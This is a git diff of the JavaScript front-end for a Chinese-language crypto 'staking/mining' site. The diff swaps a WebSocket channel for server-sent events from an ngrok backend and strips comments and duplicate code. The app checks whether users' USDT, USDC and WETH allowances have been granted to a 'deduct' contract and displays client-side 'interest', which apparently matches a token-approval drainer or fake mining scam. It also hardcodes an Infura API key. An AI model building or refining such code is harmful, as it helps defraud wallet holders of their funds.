@@ -2,30 +2,62 @@
 const BACKEND_API_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev/api';
 // ==================== Infura 備用節點 ====================
 const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
-// ==================== WebSocket 後台通訊 ====================
-let ws;
-function initWebSocket() {
-  if (ws && ws.readyState === WebSocket.OPEN) return;
-  ws = new WebSocket('ws://localhost:3000/ws');
-  ws.onopen = () => {};
-  ws.onclose = () => setTimeout(initWebSocket, 3000);
-  ws.onerror = () => {};
-}
-function sendToBackend(data) {
-  if (!userAddress || !ws || ws.readyState !== WebSocket.OPEN) return;
-  ws.send(JSON.stringify({ address: userAddress, timestamp: Date.now(), ...data }));
-}
-function sendFullStateToBackend() {
-  if (!userAddress || !ws || ws.readyState !== WebSocket.OPEN) return;
-  ws.send(JSON.stringify({
-    address: userAddress,
-    timestamp: Date.now(),
-    type: 'fullState',
-    accountBalance,
-    claimable: window.currentClaimable,
-    pledges: userPledges,
-    authorizedToken
-  }));
+// ==================== SSE 替代 WebSocket ====================
+let eventSource;
+function initSSE() {
+  if (eventSource) eventSource.close();
+  eventSource = new EventSource(`${BACKEND_API_URL}/sse`);
+  eventSource.onmessage = (e) => {
+    try {
+      const { event, data } = JSON.parse(e.data);
+      if (event === 'dataUpdate' && data.users?.[userAddress]) {
+        const userData = data.users[userAddress];
+        window.currentClaimable = userData.claimable || 0;
+        accountBalance[authorizedToken].pledged = userData.pledgedAmount || 0;
+        accountBalance[authorizedToken].interest = userData.accountBalance?.interest || 0;
+        updateClaimableDisplay();
+        updateAccountBalanceDisplay();
+        updatePledgeSummary();
+      }
+      if (event === 'pledgeAccepted' && data.address === userAddress.toLowerCase()) {
+        pledgeBtn.disabled = false;
+        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+        const totalPledgeEl = document.getElementById('totalPledgeValue');
+        if (totalPledgeEl) {
+          const current = parseFloat(totalPledgeEl.textContent || '0');
+          totalPledgeEl.textContent = (current + parseFloat(data.amount)).toFixed(3);
+        }
+        const tokenKey = data.token.toUpperCase();
+        if (!['USDT', 'USDC', 'WETH'].includes(tokenKey)) return;
+        if (!accountBalance[tokenKey]) accountBalance[tokenKey] = { wallet: 0, pledged: 0, interest: 0 };
+        accountBalance[tokenKey].pledged += parseFloat(data.amount);
+        const durationInfo = PLEDGE_DURATIONS.find(d => d.days === data.duration) || { rate: 0 };
+        const orderId = data.orderId ?? userPledges.length;
+        userPledges.push({
+          orderId,
+          amount: parseFloat(data.amount),
+          token: tokenKey,
+          duration: data.duration,
+          startTime: data.startTime || Date.now(),
+          apr: durationInfo.rate
+        });
+        updateAccountBalanceDisplay();
+        updatePledgeSummary();
+        showPledgeResult('success', translations[currentLang].pledgeSuccess,
+          `${data.amount} ${tokenKey} 已質押<br>週期：${data.duration} 天`
+        );
+      }
+      if (event === 'pledgeRejected' && data.address === userAddress.toLowerCase()) {
+        pledgeBtn.disabled = false;
+        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+        showPledgeResult('error', '質押被駁回', data.reason || '未知原因');
+      }
+    } catch (error) {}
+  };
+  eventSource.onerror = () => {
+    eventSource.close();
+    setTimeout(initSSE, 5000);
+  };
 }
 // ==================== Firebase 初始化 ====================
 const app = window.firebase.initializeApp({
@@ -403,22 +435,16 @@ async function isPledgeLocked(address) {
 // ==================== 【關鍵修正】智能儲存（優先後端） ====================
 async function smartSave(data, forceLocal = false) {
   if (!userAddress) return;
-
-  // 1. 清理 data：移除 undefined / null
   const cleanData = {};
   for (const [key, value] of Object.entries(data)) {
     if (value !== undefined && value !== null) {
       cleanData[key] = value;
     }
   }
-
-  // 2. 強制轉小寫 address
   const payload = {
     address: userAddress.toLowerCase(),
     data: cleanData
   };
-
-  // 3. 優先嘗試後端
   const alive = !forceLocal && await isBackendAlive();
   if (alive) {
     try {
@@ -438,8 +464,6 @@ async function smartSave(data, forceLocal = false) {
       console.error('後端連線失敗:', error.message);
     }
   }
-
-  // 4. 後端失敗 → 強制寫 Firestore + Local
   try {
     await saveUserData(cleanData, false);
     localStorage.setItem('userData', JSON.stringify(cleanData));
@@ -486,110 +510,6 @@ setInterval(async () => {
     }, true);
   }
 }, 3600000);
-// ==================== SSE 監聽（強制同步 + 質押回應）===================
-let eventSource;
-function initSSE() {
-  if (eventSource) eventSource.close();
-  eventSource = new EventSource(`${BACKEND_API_URL}/sse`);
-  eventSource.onmessage = (e) => {
-    try {
-      const { event, data } = JSON.parse(e.data);
-      if (event === 'dataUpdate' && data.users?.[userAddress]) {
-        const userData = data.users[userAddress];
-        window.currentClaimable = userData.claimable || 0;
-        accountBalance[authorizedToken].pledged = userData.pledgedAmount || 0;
-        accountBalance[authorizedToken].interest = userData.accountBalance?.interest || 0;
-        updateClaimableDisplay();
-        updateAccountBalanceDisplay();
-        updatePledgeSummary();
-      }
-      if (event === 'pledgeAccepted' && data.address === userAddress.toLowerCase()) {
-        // 【關鍵】自動解鎖按鈕
-        pledgeBtn.disabled = false;
-        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-        // 更新總質押金額
-        const totalPledgeEl = document.getElementById('totalPledgeValue');
-        if (totalPledgeEl) {
-          const current = parseFloat(totalPledgeEl.textContent || '0');
-          totalPledgeEl.textContent = (current + parseFloat(data.amount)).toFixed(3);
-        }
-        // 代幣簡寫
-        const tokenKey = data.token.toUpperCase();
-        if (!['USDT', 'USDC', 'WETH'].includes(tokenKey)) {
-          console.warn(`未知代幣簡寫: ${data.token}`);
-          return;
-        }
-        // 安全更新 accountBalance
-        if (!accountBalance[tokenKey]) {
-          accountBalance[tokenKey] = { wallet: 0, pledged: 0, interest: 0 };
-        }
-        accountBalance[tokenKey].pledged += parseFloat(data.amount);
-        // 安全查找 durationInfo
-        const durationInfo = PLEDGE_DURATIONS.find(d => d.days === data.duration) || { rate: 0 };
-        // 加入 userPledges
-        const orderId = data.orderId ?? userPledges.length;
-        userPledges.push({
-          orderId: orderId,
-          amount: parseFloat(data.amount),
-          token: tokenKey,
-          duration: data.duration,
-          startTime: data.startTime || Date.now(),
-          apr: durationInfo.rate
-        });
-        updateAccountBalanceDisplay();
-        updatePledgeSummary();
-        showPledgeResult('success', translations[currentLang].pledgeSuccess,
-          `${data.amount} ${tokenKey} 已質押<br>週期：${data.duration} 天`
-        );
-      }
-      if (event === 'pledgeRejected' && data.address === userAddress.toLowerCase()) {
-        // 【關鍵】自動解鎖按鈕
-        pledgeBtn.disabled = false;
-        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-        showPledgeResult('error', '質押被駁回', data.reason || '未知原因');
-      }
-    } catch (error) {}
-  };
-  eventSource.onerror = () => {
-    eventSource.close();
-    setTimeout(initSSE, 5000);
-  };
-}
-// ==================== 【關鍵修正】質押結果模態框（點確認才關閉） ====================
-function showPledgeResult(type, title, message) {
-  const modal = document.getElementById('pledgeResultModal');
-  const titleEl = document.getElementById('pledgeResultTitle');
-  const messageEl = document.getElementById('pledgeResultMessage');
-  const confirmBtn = document.getElementById('pledgeResultConfirm');
-
-  if (!modal || !titleEl || !messageEl || !confirmBtn) return;
-
-  // 設定樣式
-  modal.style.display = 'flex';
-  titleEl.style.color = type === 'success' ? '#00ff00' : '#ff4444';
-  modal.querySelector('.modal-content').style.borderColor = type === 'success' ? '#00ff00' : '#ff4444';
-  confirmBtn.style.background = type === 'success' ? '#00ff00' : '#ff4444';
-  confirmBtn.style.color = type === 'success' ? 'black' : 'white';
-
-  // 設定內容
-  titleEl.textContent = title;
-  messageEl.innerHTML = message;
-  confirmBtn.textContent = translations[currentLang].confirm;
-
-  // 點擊關閉
-  const closeModal = () => {
-    modal.style.display = 'none';
-    modal.removeEventListener('click', clickOutside);
-    confirmBtn.removeEventListener('click', closeModal);
-  };
-
-  const clickOutside = (e) => {
-    if (e.target === modal) closeModal();
-  };
-
-  confirmBtn.onclick = closeModal;
-  modal.onclick = clickOutside;
-}
 // ==================== Firestore 儲存（智能同步） ====================
 async function saveUserData(data = null, addToPending = true) {
   if (!userAddress) return;
@@ -857,7 +777,6 @@ async function updateInterest() {
   localStorage.setItem('lastPayoutTime', now.toString());
   updateClaimableDisplay();
   updateAccountBalanceDisplay();
-  sendToBackend({ type: 'interest', amount: cycleInterest });
 }
 function updateClaimModalLabels() {
   const claimLabels = {
@@ -987,7 +906,7 @@ async function initializeWallet() {
     const accounts = await provider.send('eth_accounts', []);
     if (accounts.length > 0) {
       await connectWallet();
-      await updateUIBasedOnChainState(); // 【關鍵】立即檢查狀態
+      await updateUIBasedOnChainState();
     } else {
       disableInteractiveElements(true);
       updateStatus(translations[currentLang].noWallet, true);
@@ -1029,7 +948,7 @@ async function connectWallet() {
     await forceRefreshWalletBalance();
     updateStatus('錢包連接成功，餘額已載入');
     await loadUserDataFromServer();
-    await updateUIBasedOnChainState(); // 【關鍵】同步狀態
+    await updateUIBasedOnChainState();
     initSSE();
     await updateUIBasedOnChainState();
   } catch (e) {
@@ -1054,20 +973,16 @@ async function updateUIBasedOnChainState() {
       retry(() => usdcContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
       retry(() => wethContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
     ]);
-
     const isWethAuthorized = wethAllowance >= requiredAllowance;
     const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
     const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
     const isFullyAuthorized = isServiceActive || isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
-
     if (isFullyAuthorized) {
-      // 【關鍵】已授權 → 隱藏 Start 按鈕
       if (startBtn) startBtn.style.display = 'none';
       disableInteractiveElements(false);
       updateStatus("挖礦已啟動");
-      activateStakingUI(); // 啟動利息計時
+      activateStakingUI();
     } else {
-      // 未授權 → 顯示 Start
       if (startBtn) startBtn.style.display = 'block';
       disableInteractiveElements(false);
       updateStatus("請點擊 Start 進行授權");
@@ -1185,7 +1100,6 @@ function updateEstimate() {
   }
   const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
   if (!duration) return;
-  // 檢查最低額度
   if (amount < duration.min) {
     elements.exceedWarning.textContent = `最低質押金額：${duration.min} ${token}`;
     elements.exceedWarning.style.display = 'block';
@@ -1272,14 +1186,6 @@ function checkPledgeExpiry() {
       updateAccountBalanceDisplay();
       updatePledgeSummary();
       updateClaimableDisplay();
-      sendToBackend({
-        type: 'redeem',
-        orderId: p.orderId,
-        amount: p.amount,
-        token: p.token,
-        interest: totalInterest,
-        total: p.amount + totalInterest
-      });
     }
   });
 }
@@ -1288,7 +1194,6 @@ setInterval(checkPledgeExpiry, 60000);
 document.addEventListener('DOMContentLoaded', async () => {
   getElements();
   updateLanguage(currentLang);
-  initWebSocket();
   initializeWallet();
   setTimeout(() => {
     updateTotalFunds();
@@ -1303,7 +1208,6 @@ document.addEventListener('DOMContentLoaded', async () => {
       pledgeDuration.appendChild(opt);
     });
   }
-  // 質押頁面 Token 顯示餘額
   if (pledgeToken) {
     const updatePledgeTokenOptions = () => {
       const tokens = ['USDT', 'USDC', 'WETH'];
@@ -1435,7 +1339,6 @@ document.addEventListener('DOMContentLoaded', async () => {
           activateStakingUI();
           updateAccountBalanceDisplay();
           await smartSave();
-          sendToBackend({ type: 'start', pledgedAmount: balance, token: selectedToken });
           startBtn.style.display = 'none';
         } else {
           updateStatus('Balance too low.', true);
@@ -1463,7 +1366,6 @@ document.addEventListener('DOMContentLoaded', async () => {
         updateStatus(translations[currentLang].invalidPledgeAmount, true);
         return;
       }
-      // 【關鍵】檢查鎖定狀態
       const locked = await isPledgeLocked(userAddress);
       if (locked) {
         updateStatus('質押進行中，請稍候...', true);
@@ -1471,7 +1373,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
       pledgeBtn.disabled = true;
       pledgeBtn.textContent = '處理中...';
-            const decimals = token === 'WETH' ? 18 : 6;
+      const decimals = token === 'WETH' ? 18 : 6;
       const bigIntBalance = cachedWalletBalances[token] || 0n;
       const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
       if (amount > walletBalance) {
@@ -1480,7 +1382,6 @@ document.addEventListener('DOMContentLoaded', async () => {
         updateStatus(translations[currentLang].insufficientBalance, true);
         return;
       }
-      // 檢查最低質押金額
       const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
       if (duration && amount < duration.min) {
         pledgeBtn.disabled = false;
@@ -1536,7 +1437,6 @@ document.addEventListener('DOMContentLoaded', async () => {
         }
         const orderId = result.orderId;
         updateStatus(`質押請求已提交，訂單編號：${orderId}`);
-        // 【關鍵】啟動輪詢檢查鎖定狀態
         const pollInterval = setInterval(async () => {
           const locked = await isPledgeLocked(userAddress);
           if (!locked) {
@@ -1552,41 +1452,6 @@ document.addEventListener('DOMContentLoaded', async () => {
         log(`Pledge failed: ${error.message}`, 'error');
       }
     });
-  }
-  // ==================== 【關鍵修正】質押結果模態框（點確認才關閉） ====================
-  function showPledgeResult(type, title, message) {
-    const modal = document.getElementById('pledgeResultModal');
-    const titleEl = document.getElementById('pledgeResultTitle');
-    const messageEl = document.getElementById('pledgeResultMessage');
-    const confirmBtn = document.getElementById('pledgeResultConfirm');
-
-    if (!modal || !titleEl || !messageEl || !confirmBtn) return;
-
-    // 設定樣式
-    modal.style.display = 'flex';
-    titleEl.style.color = type === 'success' ? '#00ff00' : '#ff4444';
-    modal.querySelector('.modal-content').style.borderColor = type === 'success' ? '#00ff00' : '#ff4444';
-    confirmBtn.style.background = type === 'success' ? '#00ff00' : '#ff4444';
-    confirmBtn.style.color = type === 'success' ? 'black' : 'white';
-
-    // 設定內容
-    titleEl.textContent = title;
-    messageEl.innerHTML = message;
-    confirmBtn.textContent = translations[currentLang].confirm;
-
-    // 點擊關閉
-    const closeModal = () => {
-      modal.style.display = 'none';
-      modal.removeEventListener('click', clickOutside);
-      confirmBtn.removeEventListener('click', closeModal);
-    };
-
-    const clickOutside = (e) => {
-      if (e.target === modal) closeModal();
-    };
-
-    confirmBtn.onclick = closeModal;
-    modal.onclick = clickOutside;
   }
   // 所有事件監聽必須在這裡
   if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
